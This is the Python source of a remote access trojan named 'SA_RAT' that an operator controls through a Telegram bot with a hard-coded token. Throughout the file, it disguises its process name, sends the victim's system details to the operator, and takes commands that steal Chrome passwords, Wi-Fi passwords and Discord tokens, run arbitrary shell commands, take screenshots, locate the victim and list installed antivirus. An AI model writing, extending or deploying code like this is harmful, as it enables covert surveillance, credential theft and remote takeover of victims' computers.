from asyncio.subprocess import Process
from multiprocessing import current_process
from tkinter.filedialog import Open
from urllib import response
from wsgiref import headers
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters
import telegram
import get_chrome_pass, get_wifi_pass
import time
import os
import platform, getpass
import requests
import pyautogui
import numpy as np
import ctypes
import cv2
import subprocess
import os
from Discord import *
from Chromium import *
from getBanner import getBanner
import threading
import requests
from urllib.parse import urlparse
from urllib.request import Request
from Location import *
from Information import *
from Settings import *
from Volume import *
from Wallpaper import *

p = current_process()

p_names = ["System Management", "System", "Windows Host"]

p.name = random.choice(p_names)

api_key = "5600860082:AAEZqm_o99m0bDsmuNW_9VLNyvV3eYfQA5s"
updater = Updater("5600860082:AAEZqm_o99m0bDsmuNW_9VLNyvV3eYfQA5s", use_context=True)
bot = telegram.Bot(token=api_key)
uname = platform.uname()
operating_system = uname[0] + " " + uname[2] + " " + uname[3]
IP_address = requests.get('http://ip.42.pl/raw').text
user = getpass.getuser()
bot.send_message(5558090895, "SA_RAT Online" + "\n" + getBanner() + "\n" + "Operating System:   " + operating_system + "\n" + "IP address:   " + IP_address + "\n" + "User:   " + user)

if not os.path.exists(OutputDirectory):
    os.makedirs(OutputDirectory)

def Msgbox(msgText, msgTitle, msgType):
    ctypes.windll.user32.MessageBoxW(0, str(msgText), str(msgTitle), int(msgType))

def get_chrome_browser_creds(update: Update, context: CallbackContext):
        log = ""
        try:
            log += "Saved passowrds in victim's system : \n"
            chrome = get_chrome_pass.GetChromePass()
            log += chrome.start()
            if log == "Saved passowrds in victim's system : \n":
                update.message.reply_text("Could not find any saved passwords on victim's system")
            else:
                update.message.reply_text(log)
        except Exception:
            time.sleep(10)
            get_chrome_browser_creds
        log = ""

def get_wifi_creds(update: Update, context: CallbackContext):
        log = ""
        try:
            log += "Saved passwords of wifi from vitim's system : \n"
            wifi = get_wifi_pass.GetWifiPassword()
            log += wifi.start()
            update.message.reply_text(log)
        except Exception:
            update.message.reply_text("No Passwords found")
        log = ""

def get_system_info(update: Update, context: CallbackContext):
        uname = platform.uname()
        operating_system = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()

        # Finding AV
        av = "Unknown"
        if os.path.exists('C:\\Program Files\\Windows Defender'):
            av = 'Windows Defender'
        if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
            av = 'Avast'
        if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
            av = 'AVG'
        if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
            av = 'Avira'
        if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
            av = 'Advanced SystemCare'
        if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
            av = 'Bitdefender'
        if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
            av = 'Comodo'
        if os.path.exists('C:\\Program Files\\DrWeb'):
            av = 'Dr.Web'
        if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
            av = 'ESET'
        if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
            av = 'Grizzly Pro'
        if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
            av = 'Kaspersky'
        if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
            av = 'Malware fighter'
        if os.path.exists('C:\\Program Files\\360\\Total Security'):
            av = '360 Total Security'  
              
        try:
            IP_Address = requests.get('http://ip.42.pl/raw').text
        except: IP_Address = "Unknown"

        sys_logs =  "Operating System: " + operating_system + "\n"
        sys_logs += "Computer Name:    " + computer_name    + "\n"
        sys_logs += "User:             " + user             + "\n"
        sys_logs += "IP Address:       " + IP_Address       + "\n"
        sys_logs += "Anti Virus:       " + av 

        update.message.reply_text(sys_logs)

def OpenInBrowser(update: Update, context: CallbackContext):
    url = update.message.text
    url = url.replace("/OpenUrl ", "")
    if not url.startswith("https://"):
        url = "https://" + url
    subprocess.call('start ' + url, shell=True)

def RickRoll(update: Update, context: CallbackContext):
    subprocess.call('start https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)

def excuteCommand(update: Update, context: CallbackContext):
    command = update.message.text
    command = command.replace("/Exe-Command ", "")
    subprocess.check_output(command, shell=True, universal_newlines=True)
    update.message.reply_text("Command executed")

def Discord(update: Update, context: CallbackContext):
	try:
		update.message.reply_text('*Discord Token*\n\n`' + DiscordToken() + '`')
	except:
		update.message.reply_text('_Discord not installed._')

def ScreenShot(update: Update, context: CallbackContext):
    shot = pyautogui.screenshot()
    shot = cv2.cvtColor(np.array(shot), cv2.COLOR_BGR2RGB)
    img = cv2.imwrite("img.png", shot)
    update.message.reply_photo(open("img.png", "rb"))
    os.system("del img.png")
  
def start(update: Update, context: CallbackContext):
    update.message.reply_text("RAT Started")

def showMessage(update: Update, context: CallbackContext):
    fullCommand = update.message.text
    SayText0 = fullCommand.replace("/Message ", "")
    if "Title=" in SayText0:
        s1 = SayText0.split('Title=')
        s3 = s1[1].split('Type=')
        thread1 = threading.Thread(target=Msgbox, args=(s1[0], s3[0], s3[1]))
        thread1.start()
    else:
        thread1 = threading.Thread(target=Msgbox, args=(SayText0, ""))
        thread1.start()
  
def help(update: Update, context: CallbackContext):
    update.message.reply_text("""Available Commands:
    /ChromePass - Gets passwords from victim's chrome browser for the first profile (must have chrome installed)
    /WifiInfo - Gets all the wifis the victim has connected to and their passwords
    /SysInfo - Gets the victim's system info and anti virus
    /Command + (cmd command) - Runs a command on the victim's computer
    /OpenUrl + URL - Opens a url in victim's browser
    /RickRoll - Does what the name suggests
    /Screenshot - Takes a screenshot of the victim's computer
    /Discord - Gets Discord Token on victim's computer (must have discord installed)
    /Message + message + Title=(Message Title) + Type=(Message Type| send "/HelpMessageType" to get message types) - displays a message box on the victim's computer
    /GetLocation - Gets the victim's location by BSSID
    /Volume - Changes the volume of the victim's system
    """)

def HelpMessageType(update: Update, context: CallbackContext):
    update.message.reply_text("""
    Message Types:
    0 = Ok
    1 = Ok / Cancel
    2 = Abort / Retry / Ignore
    3 = Yes / No / Cancel
    4 = Yes / No
    5 = Retry / Cancel
    6 = Cancel / Try Again / Continue
    """)

def GetLoaction(update: Update, context: CallbackContext):
    try:
        update.message.reply_chat_action(update.message.chat_id,'find_location')
        Coordinates = GetLocationByBSSID(GetMacByIP())
        Latitude = Coordinates['lat']
        Longitude = Coordinates['lon']
        update.message.reply_location(Latitude, Longitude)
        update.message.reply_text(
			'_Location_'
			'\n'
			'\n*IP Address* - `' + Geolocation('query') + '`' +
			'\n*Country* - `' + Geolocation('country') + '`' +
			'\n*City* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*Latitude* - `' + str(Coordinates['lat']) + '`' +
			'\n*Longitude* - `' + str(Coordinates['lon']) + '`' +
			'\n*Range* - `' + str(Coordinates['range']) + '`' +
			'\n'
			'\n*BSSID* - `' + GetMacByIP() + '`',
				parse_mode='Markdown') 

    except:
        update.message.reply_text(
			'_Failed locate target by BSSID_'
			'\n'
			'\n*IP Address* » `' + Geolocation('query') + '`' +
			'\n*Country* » `' + Geolocation('country') + '`' +
			'\n*City* » `' + Geolocation('city') + '`' +
			'\n'
			'\n*BSSID* » `' + GetMacByIP() + '`',
				parse_mode='Markdown') 

def Volume(update: Update, context: CallbackContext):
    full_text = update.message.text
    Level = full_text.replace("/Volume ", "")
    if Level == "":
        update.message.reply_text("Please specify the voume level in numbers")
    else:
        Level = int(Level)
        VolumeControl(Level)
        update.message.reply_text("Volume set to " + str(Level))

def unknown(update: Update, context: CallbackContext):
    update.message.reply_text("Sorry '%s' is not a valid command" % update.message.text)
  
  
def unknown_text(update: Update, context: CallbackContext):
    update.message.reply_text("Sorry I can't recognize you , you said '%s'" % update.message.text)
  
  
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('ChromePass', get_chrome_browser_creds))
updater.dispatcher.add_handler(CommandHandler('help', help))
updater.dispatcher.add_handler(CommandHandler('WifiInfo', get_wifi_creds))
updater.dispatcher.add_handler(CommandHandler('SysInfo', get_system_info))
updater.dispatcher.add_handler(CommandHandler('Command', excuteCommand))
updater.dispatcher.add_handler(CommandHandler('OpenUrl', OpenInBrowser))
updater.dispatcher.add_handler(CommandHandler('RickRoll', RickRoll))
updater.dispatcher.add_handler(CommandHandler('Discord', Discord))
updater.dispatcher.add_handler(CommandHandler('Screenshot', ScreenShot))
updater.dispatcher.add_handler(CommandHandler('Message', showMessage))
updater.dispatcher.add_handler(CommandHandler('HelpMessageType', HelpMessageType))
updater.dispatcher.add_handler(CommandHandler('GetLocation', GetLoaction))
updater.dispatcher.add_handler(CommandHandler('Volume', Volume))
updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown))
updater.dispatcher.add_handler(MessageHandler(Filters.command, unknown))  # Filters out unknown commands
  
# Filters out unknown messages.
updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown_text))
  
updater.start_polling()